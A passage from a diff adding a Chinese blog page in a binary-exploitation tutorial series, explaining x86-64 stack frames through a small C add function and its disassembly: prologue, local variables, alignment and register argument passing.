+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#栈帧">栈帧</a>
+      <ul>
+        <li><a href="#函数序言">函数序言</a></li>
+        <li><a href="#局部变量的储存">局部变量的储存</a></li>
+        <li><a href="#参数传递">参数传递</a></li>
+        <li><a href="#函数调用栈帧开辟">函数调用、栈帧开辟</a></li>
+        <li><a href="#函数返回栈帧销毁">函数返回、栈帧销毁</a></li>
+      </ul>
+    </li>
+    <li><a href="#栈溢出">栈溢出</a></li>
+    <li><a href="#rop返回导向编程">ROP（返回导向编程）</a></li>
+    <li><a href="#ret2text">ret2text</a>
+      <ul>
+        <li><a href="#16进制对齐">16进制对齐</a></li>
+        <li><a href="#rop链传参">ROP链传参</a></li>
+      </ul>
+    </li>
+    <li><a href="#后记">后记</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    目录
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#栈帧">栈帧</a>
+      <ul>
+        <li><a href="#函数序言">函数序言</a></li>
+        <li><a href="#局部变量的储存">局部变量的储存</a></li>
+        <li><a href="#参数传递">参数传递</a></li>
+        <li><a href="#函数调用栈帧开辟">函数调用、栈帧开辟</a></li>
+        <li><a href="#函数返回栈帧销毁">函数返回、栈帧销毁</a></li>
+      </ul>
+    </li>
+    <li><a href="#栈溢出">栈溢出</a></li>
+    <li><a href="#rop返回导向编程">ROP（返回导向编程）</a></li>
+    <li><a href="#ret2text">ret2text</a>
+      <ul>
+        <li><a href="#16进制对齐">16进制对齐</a></li>
+        <li><a href="#rop链传参">ROP链传参</a></li>
+      </ul>
+    </li>
+    <li><a href="#后记">后记</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+  <details
+    class="mt-2 mb-5 overflow-hidden rounded-lg ms-0 ps-5"
+    open>
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 -ms-5 ps-5 dark:bg-primary-800 dark:text-neutral-100">
+    Pwn -
+    这篇文章属于一个选集。
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/pwntools/">
+          § 1:
+          Python Pwntools的基础使用方法
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/elf-basic/">
+          § 2:
+          ELF、内存装载、栈与寄存器
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        § 3:
+        本文
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+        <a href="/posts/pwn/pivot/">
+          § 7:
+          栈迁移
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>活跃的栈帧由栈顶和栈底划定，同一时刻只有一个活跃的函数及栈帧，那么栈帧是什么样的？它如何和函数配合工作的？</p>
+
+<h2 class="relative group">栈帧
+    <div id="栈帧" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e6%a0%88%e5%b8%a7" aria-label="锚点">#</a>
+    </span>
+    
+</h2>
+<p>以一个简单的64位程序为例子，观察<code>add</code>函数调用时栈的情况，去讲解这个过程：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -fno-stack-protector -no-pie -z lazy -O0 test.c -o test
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp"># include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">d</span><span class="p">,</span> <span class="kt">int</span> <span class="n">e</span><span class="p">,</span> <span class="kt">int</span> <span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">g</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span> <span class="o">+</span> <span class="n">e</span> <span class="o">+</span> <span class="n">f</span> <span class="o">+</span> <span class="n">g</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">f</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">g</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">g</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>其<code>main</code>函数汇编代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">endbr64</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span>    <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x20</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">],</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="p">],</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x14</span><span class="p">],</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">],</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2e8f</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">r9d</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x14</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">r8d</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">esi</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span>   <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">call</span>   <span class="no">add</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">add</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gadget</span> <span class="mi">5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">leave</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ret</span>
+</span></span></code></pre></div>
+<h3 class="relative group">函数序言
+    <div id="函数序言" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%87%bd%e6%95%b0%e5%ba%8f%e8%a8%80" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>我们编写C语言代码时，程序的入口都是<code>main</code>函数，实际上一个真正的程序入口函数是<code>start</code>函数，start函数负责一些初始化工作，初始化完成后调用main函数执行程序的主要工作。从start函数转换到main函数，使用了函数序言<code>gadget 0</code>。这个序言是编译时给每个函数加上的<strong>通用的一段代码</strong>，起到一个<strong>安全检查和备份寄存器数据</strong>的作用，至于具体有什么用，咱们一会在<code>add</code>的函数序言再说。</p>
+<p>总之现在还啥都没干，栈帧是空的：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈帧布局"
+    width="546"
+    height="176"
+    src="/posts/pwn/ret2text/resources/image1.png"
+    srcset="/posts/pwn/ret2text/resources/image1.png 800w, /posts/pwn/ret2text/resources/image1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image1.png"></figure>
+
+<h3 class="relative group">局部变量的储存
+    <div id="局部变量的储存" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%b1%80%e9%83%a8%e5%8f%98%e9%87%8f%e7%9a%84%e5%82%a8%e5%ad%98" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>在main函数中，我们声明了6个局部int变量，因此<code>gadget 1</code>开辟了一片空间去存储这6个变量。由于<strong>栈向低内存地址生长</strong>，因此rsp<strong>减去对应大小字节</strong>以开辟对应空间。</p>
+<p>int型变量占用4字节，6个变量理论上只需要24字节的空间，不过<strong>64位程序栈空间要求栈指针16字节对齐</strong>，因此向上取个32字节取整。<strong>在32位程序中，理论上只有4字节对齐要求，但是有些编译器也会保证16字节对齐</strong>。</p>
+<p>可以发现，程序<strong>以栈底为参考，去寻找局部变量的地址</strong>，此时的栈帧布局如下：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈帧布局"
+    width="502"
+    height="955"
+    src="/posts/pwn/ret2text/resources/image2.png"
+    srcset="/posts/pwn/ret2text/resources/image2.png 800w, /posts/pwn/ret2text/resources/image2.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image2.png"></figure>
+<p>（rbp下面还有16字节的东西，是干什么用的呢？一会到<code>add</code>再说）</p>
+
+<h3 class="relative group">参数传递
+    <div id="参数传递" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>在<code>gadget 2</code>中，程序将栈区的局部变量和<code>.data</code>段的全局变量一起传参，其中<code>a</code>作为<strong>非零全局变量</strong>存储在<code>.data</code>段，并且以<code>rip</code>为参考寻址。</p>
+<p>在64位程序中，函数的前六个参数通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>传递，<strong>之后的参数都会压栈，通过栈传递</strong>。而<strong>在32位程序中，所有的参数都通过栈传递</strong>。程序在传递参数时使用的是e寄存器，只操作低4字节，清空用不到的高4字节，可以<strong>以更少的字节数写出相同效果的指令</strong>。参数<code>g</code>先赋值给rdi再压入栈中，而参数<code>a</code>先赋值给rax再赋值给rdi。</p>
+<p>栈帧布局如下：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈帧布局"
+    width="1247"
+    height="1035"
+    src="/posts/pwn/ret2text/resources/image3_hu_98f9a7237237cf10.png"
+    srcset="/posts/pwn/ret2text/resources/image3_hu_98f9a7237237cf10.png 800w, /posts/pwn/ret2text/resources/image3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image3.png"></figure>
+
+<h3 class="relative group">函数调用、栈帧开辟
+    <div id="函数调用栈帧开辟" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e6%a0%88%e5%b8%a7%e5%bc%80%e8%be%9f" aria-label="锚点">#</a>
+    </span>
+    
+</h3>
+<p>接下来在<code>gadget 3</code>中调用<code>add</code>函数，看一下<code>add</code>的汇编代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">endbr64</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span>   <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">4</span><span class="p">],</span> <span class="no">edi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">],</span> <span class="no">esi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="p">],</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x14</span><span class="p">],</span> <span class="no">r8d</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">],</span> <span class="no">r9d</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x14</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">edx</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span>    <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><p><code>call</code>指令可以看作两个指令：<code>push rip; jmp</code>，这样会在栈上存储rip寄存器的值，保证返回到指定的地址。</p>
+<p><code>add</code>函数也有函数序言，在这里详细解释一下序言的意义：</p>
+<ul>
+<li>
+<p><code>endbr64</code>是一个检查语句，当程序用<code>call</code>或<code>jmp</code>指令<strong>间接跳转</strong>时，会检查跳转地址是否是这个语句，是则允许控制流继续执行，不是则拒绝执行。</p>
+</li>
+<li>
+<p>而<code>push rbp; mov rbp, rsp</code>相当于在栈上存储了rbp的值后移动了rbp。由于调用了新的函数，活跃栈帧发生了变化，而<code>add</code>函数返回后活跃栈帧会回到<code>main</code>的栈帧，因此存储旧rbp的值便于恢复栈帧。</p>
+</li>
+</ul>
+<p>所以说函数的调用以及其序言，在<strong>栈帧高处</strong>存储了返回地址和rbp的值，而<strong>新的rbp指向栈上存储的旧的rbp</strong>：</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="栈帧布局"
+    width="657"
+    height="360"
+    src="/posts/pwn/ret2text/resources/image4.png"
+    srcset="/posts/pwn/ret2text/resources/image4.png 800w, /posts/pwn/ret2text/resources/image4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/posts/pwn/ret2text/resources/image4.png"></figure>
